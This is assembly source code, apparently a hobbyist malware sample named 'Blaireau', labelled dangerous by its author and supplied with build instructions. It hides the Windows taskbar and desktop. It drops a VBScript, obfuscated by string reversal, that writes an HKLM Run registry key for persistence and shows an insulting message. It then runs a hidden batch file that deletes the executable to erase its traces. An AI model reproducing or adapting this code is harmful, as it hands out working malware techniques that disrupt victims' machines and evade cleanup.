; =========================================================================
; -------------------------------------------------------------------------
;     FILENAME : Blaireau.asm
; -------------------------------------------------------------------------
;       AUTHOR : Xylitol
;        EMAIL : xylitol☆temari.fr
; DATE CREATED : 16/06/2014
;         TEST : Windows XP SP3
;         SIZE : 3Kb - 21e3c553ef9ba6a2535a6fa159d81252
;  DESCRIPTION : Hide the taskbar, drop a VBS and auto-destruct
; -------------------------------------------------------------------------
;                 This source is considered dangerous
; -------------------------------------------------------------------------
; =========================================================================

; ---- make.bat -----------------------------------------------------------
;@echo off
;set path=\masm32\bin
;set lib=\masm32\lib
;set name=Blaireau
;set rsrc=rsrc
;ml.exe /c /coff "%name%".asm
;link.exe /SUBSYSTEM:WINDOWS /opt:nowin98 /LIBPATH:"%lib%" "%name%".obj
;del *.OBJ
;pause
;@echo on
;cls

; ---- skeleton -----------------------------------------------------------

      .386
      .model flat, stdcall
      option casemap :none   ; case sensitive

; ---- Include ------------------------------------------------------------

      include \masm32\include\windows.inc
      include \masm32\include\user32.inc
      include \masm32\include\kernel32.inc
      include \masm32\include\shell32.inc
      include \masm32\macros\macros.asm
	  
      includelib \masm32\lib\shell32.lib
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib

; #########################################################################

.data?
szlen 		dd		?
szReversed 	db 		512 dup(?)
tmpFilePath 	db 		512 dup(?)
payload 	db 		512 dup(?)

.data
shell		db "Shell_TrayWnd",0
explorer	db "Progman",0
Filename 	db "Blaireau.vbs",0
Filename2 	db "Blaireau.bat",0

payload1	db " tpircsw",022h,",",022h,"kcirreD\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH",022h," etirWgeR.tideger",13,10
		db ")",022h,"llehS.tpircSW",022h,"(tcejbOetaerC = tideger teS",13,10
		db ")1(redloFlaicepSteG.osf = metsysrid teS",13,10
		db "txeN emuseR rorrE nO",13,10
		db ")",022h,"tcejbOmetsySeliF.gnitpircS",022h,"(tcejbOetaerC = osf teS",13,10
		db "metsysrid ,osf miD",0
			
payload2	db 022h,"ékiN T",022h," xobgsM",13,10
			db 022h,0
			
melt		db ":repeat",13,10
		db "if not exist ",022h,"blaireau.exe",022h," goto exit",13,10
		db "attrib -R -S -H ",022h,"blaireau.exe",022h,13,10
		db "erase ",022h,"blaireau.exe",13,10
		db "goto repeat",13,10
		db ":exit",13,10
		db "attrib -R -S -H ",022h,"Blaireau.bat",022h,13,10
		db "erase ",022h,"Blaireau.bat",022h,0

.code
start:
		invoke GetTempPath, 255,addr tmpFilePath
		invoke lstrcat,addr tmpFilePath,addr Filename
		
		invoke lstrlen, addr tmpFilePath
		mov ecx,eax
		mov esi, offset tmpFilePath
		call lstrrev
		
		invoke lstrcpy,addr payload,addr payload2
		invoke lstrcat,addr payload,addr szReversed
		invoke lstrcat,addr payload,addr payload1
		
DlgProc	proc
		hWin	:DWORD,
		uMsg	:DWORD,
		wParam	:DWORD,
		lParam	:DWORD
	LOCAL	hFile	:DWORD,
		NumBytes:DWORD

invoke FindWindow,addr shell,NULL ;  Get handle first then hide it. 
.if eax != 0
    invoke ShowWindow,eax,SW_HIDE ; use SW_SHOW to show it again
.endif
invoke FindWindow,addr explorer,NULL
.if eax != 0
invoke ShowWindow,eax,SW_HIDE
.endif

		invoke lstrlen, addr payload
		mov ecx,eax
		mov esi, offset payload
		call lstrrev

		invoke lstrlen,addr szReversed
		mov szlen,eax

		invoke CreateFile,addr tmpFilePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov hFile,eax
		invoke WriteFile, hFile,addr szReversed, szlen, addr NumBytes, NULL

		invoke CloseHandle,hFile 
		mov szlen,0

		invoke lstrlen,addr melt
		mov szlen,eax

		invoke CreateFile,addr Filename2,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov hFile,eax
		invoke WriteFile, hFile,addr melt, szlen, addr NumBytes, NULL
		invoke CloseHandle,hFile 
		mov szlen,0
		
		invoke ShellExecute,hWin,chr$("open"),addr tmpFilePath,NULL,NULL,SW_SHOWNORMAL
		invoke ShellExecute,hWin,chr$("open"),addr Filename2,NULL,NULL,SW_HIDE
		push 0
		call ExitProcess

DlgProc	endp

lstrrev proc
	lea edi, offset szReversed
	xor ebx, ebx
		Reversor:
			mov al, byte ptr[esi+ecx-1]
			mov byte ptr[edi+ebx], al
			inc ebx
			dec ecx
		jnz Reversor
			mov byte ptr[edi+ebx], 0
	Ret
lstrrev endp

end start